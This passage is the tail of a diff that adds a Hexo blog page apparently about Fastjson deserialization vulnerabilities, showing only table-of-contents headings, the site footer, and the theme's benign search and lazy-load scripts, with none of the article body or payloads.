1.2.25-1.2.42</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fastjson-1-2-25-1-2-43"><span class="toc-text">Fastjson 1.2.25-1.2.43</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fastjson-1-2-25-1-2-45"><span class="toc-text">Fastjson 1.2.25-1.2.45</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fastjson-lt-1-2-47"><span class="toc-text">Fastjson &lt;&#x3D;1.2.47</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#fastjson-lt-1-2-68"><span class="toc-text">fastjson &lt;&#x3D;1.2.68</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Dnslog-%E6%8E%A2%E6%B5%8B-Fastjson"><span class="toc-text">Dnslog 探测 Fastjson</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E7%AA%81%E7%A0%B4%E9%BB%91%E5%90%8D%E5%8D%95%E7%9A%84-Paylod"><span class="toc-text">一些突破黑名单的 Paylod</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        <div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/Weik1">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="email" href="1252820849@qq.com">
+            <i class="iconfont icon-envelope"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="facebook" href="">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" href="">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="wechat" href="">
+            <i class="iconfont icon-wechat"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="weibo" href="">
+            <i class="iconfont icon-weibo"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="rss" href="/atom.xml">
+            <i class="iconfont icon-rss"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © Oranges 2020</a>
+        
+    </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="back-to-top hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+      
+  <div class="search-icon" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+    </div>
+  <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(n){n.imageLazyLoadSetting.processImages=i;var e=n.imageLazyLoadSetting.isSPA,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function i(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight||document.documentElement.clientHeight)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e&&e()},n.src=i}()}i(),n.addEventListener("scroll",function(){var t,e;t=i,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script></body>
+</html>
